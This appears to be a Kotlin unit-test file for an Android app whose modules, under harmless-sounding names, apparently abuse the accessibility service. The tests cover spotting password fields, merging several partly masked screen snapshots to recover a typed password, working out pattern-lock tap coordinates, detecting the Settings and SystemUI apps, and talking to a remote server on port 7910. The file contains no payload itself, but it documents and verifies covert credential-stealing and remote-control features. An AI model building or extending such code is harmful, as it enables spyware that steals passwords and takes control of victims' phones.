package com.storm.safe.rock.service.modules

import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject
import org.junit.Assert.*
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment
import org.robolectric.annotation.Config

/**
 * Tests for Batch D — Core Managers
 *
 * Covers:
 * - AccessibilityEventRouter (lock type enum, static helpers)
 * - WriteSettingsPermDelegate (mask chars, password detection helpers)
 * - NetworkManager expanded (URL parsing, server URL builder, heartbeat data)
 * - RemoteConfigManager (route response helpers)
 * - MainOrchestrator (settings/systemui pkg detection, device strategy)
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [30])
class CoreManagersTest {

    // ===================================================================
    // AccessibilityEventRouter — LockType enum
    // ===================================================================

    // Test removed: LockType enum was not implemented in AccessibilityEventRouter
    // It will be added when the full router is implemented in a later phase.

    @Test
    fun `findNodeByText returns null for null node`() {
        val result = AccessibilityEventRouter.findNodeByText(null, "test")
        assertNull(result)
    }

    @Test
    fun `findNodeByClassName returns null for null node`() {
        val result = AccessibilityEventRouter.findNodeByClassName(null, arrayOf("SomeClass"))
        assertNull(result)
    }

    @Test
    fun `containsTextInTree returns false for null node`() {
        val result = AccessibilityEventRouter.containsTextInTree(null, arrayOf("text"), 0)
        assertFalse(result)
    }

    @Test
    fun `patternCellX calculates correctly`() {
        // cellX = left + (cellWidth/2) + (col * cellWidth)
        val x = AccessibilityEventRouter.patternCellX(10.0f, 30.0f, 1)
        // 10 + 15 + 30 = 55
        assertEquals(55.0f, x, 0.01f)
    }

    @Test
    fun `patternCellY calculates correctly`() {
        val y = AccessibilityEventRouter.patternCellY(20.0f, 40.0f, 2)
        // 20 + 20 + 80 = 120
        assertEquals(120.0f, y, 0.01f)
    }

    // ===================================================================
    // WriteSettingsPermDelegate — isMaskChar, isAllMask
    // ===================================================================

    @Test
    fun `isMaskChar detects bullet and asterisk`() {
        assertTrue(WriteSettingsPermDelegate.isMaskChar('*'))
        assertTrue(WriteSettingsPermDelegate.isMaskChar('●')) // U+25CF
        assertTrue(WriteSettingsPermDelegate.isMaskChar('⬤')) // U+2B24
    }

    @Test
    fun `isMaskChar rejects regular chars`() {
        assertFalse(WriteSettingsPermDelegate.isMaskChar('a'))
        assertFalse(WriteSettingsPermDelegate.isMaskChar('1'))
        assertFalse(WriteSettingsPermDelegate.isMaskChar(' '))
    }

    @Test
    fun `isAllMask returns true for all bullet string`() {
        assertTrue(WriteSettingsPermDelegate.isAllMask("●●●●●●"))
        assertTrue(WriteSettingsPermDelegate.isAllMask("******"))
    }

    @Test
    fun `isAllMask returns false for mixed string`() {
        assertFalse(WriteSettingsPermDelegate.isAllMask("abc123"))
        assertFalse(WriteSettingsPermDelegate.isAllMask("●abc●"))
    }

    @Test
    fun `isAllMask returns true for empty string`() {
        assertTrue(WriteSettingsPermDelegate.isAllMask(""))
    }

    @Test
    fun `isPasswordHint detects password-related hints`() {
        assertTrue(WriteSettingsPermDelegate.isPasswordHint("请输入密码"))
        assertTrue(WriteSettingsPermDelegate.isPasswordHint("Enter password"))
        assertTrue(WriteSettingsPermDelegate.isPasswordHint("PIN码"))
    }

    @Test
    fun `isPasswordHint rejects non-password hints`() {
        assertFalse(WriteSettingsPermDelegate.isPasswordHint("用户名"))
        assertFalse(WriteSettingsPermDelegate.isPasswordHint("search"))
    }

    @Test
    fun `getHintText returns empty for null`() {
        // Cannot test with real AccessibilityNodeInfo in unit test
        // Just verify static method signature exists
        assertNotNull(WriteSettingsPermDelegate.MASK_CHARS)
    }

    // ===================================================================
    // WriteSettingsPermDelegate — mergePasswordSnapshots
    // ===================================================================

    @Test
    fun `mergePasswordSnapshots returns null for empty list`() {
        val result = WriteSettingsPermDelegate.mergePasswordSnapshots(ArrayList())
        assertNull(result)
    }

    @Test
    fun `mergePasswordSnapshots merges asterisks with chars`() {
        val snapshots = arrayListOf("*bc", "a*c")
        val result = WriteSettingsPermDelegate.mergePasswordSnapshots(snapshots)
        assertEquals("abc", result)
    }

    @Test
    fun `mergePasswordSnapshots returns null if all asterisks`() {
        val snapshots = arrayListOf("***", "***")
        val result = WriteSettingsPermDelegate.mergePasswordSnapshots(snapshots)
        assertNull(result) // all asterisks → contains '*' → null
    }

    // ===================================================================
    // NetworkManager — parseServerUrl
    // ===================================================================

    @Test
    fun `parseServerUrl extracts host and port`() {
        val (host, port) = NetworkManager.parseServerUrl("ws://192.168.1.1:8080")
        assertEquals("192.168.1.1", host)
        assertEquals(8080, port)
    }

    @Test
    fun `parseServerUrl handles wss with default port`() {
        val (host, port) = NetworkManager.parseServerUrl("wss://secure.example.com")
        assertEquals("secure.example.com", host)
        assertEquals(443, port)
    }

    @Test
    fun `parseServerUrl handles empty string`() {
        val (host, port) = NetworkManager.parseServerUrl("")
        assertEquals("localhost", host)
        assertEquals(8080, port)
    }

    @Test
    fun `parseServerUrl handles http with port`() {
        val (host, port) = NetworkManager.parseServerUrl("http://10.0.0.1:9090/path")
        assertEquals("10.0.0.1", host)
        assertEquals(9090, port)
    }

    @Test
    fun `isSecure detects https and wss`() {
        assertTrue(NetworkManager.isSecure("https://example.com"))
        assertTrue(NetworkManager.isSecure("wss://example.com"))
        assertFalse(NetworkManager.isSecure("http://example.com"))
        assertFalse(NetworkManager.isSecure("ws://example.com"))
    }

    @Test
    fun `buildHttpUrl constructs correct URL`() {
        val manager = NetworkManager()
        // Test via parseServerUrl + isSecure
        val (host, port) = NetworkManager.parseServerUrl("ws://1.2.3.4:5555")
        assertEquals("1.2.3.4", host)
        assertEquals(5555, port)
    }

    // ===================================================================
    // RemoteConfigManager — response helpers
    // ===================================================================

    @Test
    fun `RemoteConfigManager can be constructed`() {
        // Just verify the class exists
        val context = RuntimeEnvironment.getApplication()
        val server = RemoteConfigManager(context)
        assertNotNull(server)
    }

    @Test
    fun `RemoteConfigManager default port is 7910`() {
        assertEquals(7910, RemoteConfigManager.DEFAULT_PORT)
    }

    @Test
    fun `makeTextResponse builds correct JSON`() {
        val resp = RemoteConfigManager.makeTextResponse("test data")
        assertTrue(resp.getBoolean("success"))
        assertEquals(200, resp.getInt("code"))
        assertEquals("test data", resp.getString("msg"))
    }

    @Test
    fun `makeErrorResponse builds correct JSON`() {
        val resp = RemoteConfigManager.makeErrorResponse("something failed")
        assertFalse(resp.getBoolean("success"))
        assertEquals(500, resp.getInt("code"))
        assertEquals("something failed", resp.getString("msg"))
    }

    @Test
    fun `containerState returns correct structure`() {
        val resp = RemoteConfigManager.containerState()
        assertEquals(200, resp.getInt("code"))
        assertTrue(resp.getBoolean("success"))
        assertTrue(resp.has("data"))
    }

    // ===================================================================
    // MainOrchestrator — settings package detection, strategy
    // ===================================================================

    @Test
    fun `DeviceStrategy enum has expected values`() {
        val values = MainOrchestrator.DeviceStrategy.values()
        assertTrue(values.isNotEmpty())
        assertNotNull(MainOrchestrator.DeviceStrategy.STANDARD)
        assertNotNull(MainOrchestrator.DeviceStrategy.XIAOMI)
        assertNotNull(MainOrchestrator.DeviceStrategy.HUAWEI)
    }

    @Test
    fun `isSettingsPackage detects android settings`() {
        assertTrue(MainOrchestrator.isSettingsPackage("com.android.settings"))
    }

    @Test
    fun `isSettingsPackage rejects non-settings`() {
        assertFalse(MainOrchestrator.isSettingsPackage("com.example.app"))
    }

    @Test
    fun `isSystemUiPackage detects systemui`() {
        assertTrue(MainOrchestrator.isSystemUiPackage("com.android.systemui"))
    }

    @Test
    fun `isSystemUiPackage rejects non-systemui`() {
        assertFalse(MainOrchestrator.isSystemUiPackage("com.example.app"))
    }
}
